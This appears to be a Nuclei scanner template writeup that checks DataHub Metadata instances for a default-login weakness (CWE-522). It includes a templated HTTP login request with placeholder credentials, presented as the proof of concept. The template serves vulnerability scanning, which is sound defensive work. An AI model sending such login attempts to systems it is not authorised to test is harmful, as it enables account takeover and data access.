# Nuclei Template: DataHub Metadata - Default Login
**Template ID:** datahub-metadata-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`datahub-metadata-default-login.yaml`)

## Vulnerability Information & PoC

## Description
DataHub Metadata contains a default login vulnerability.  An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.

## Steps to reproduce / Exploit Payload
```http
POST /logIn HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"username":"{{username}}","password":"{{password}}"}
```

## References
- https://github.com/datahub-project/datahub/blob/master/docs/rfc/active/access-control/access-control.md
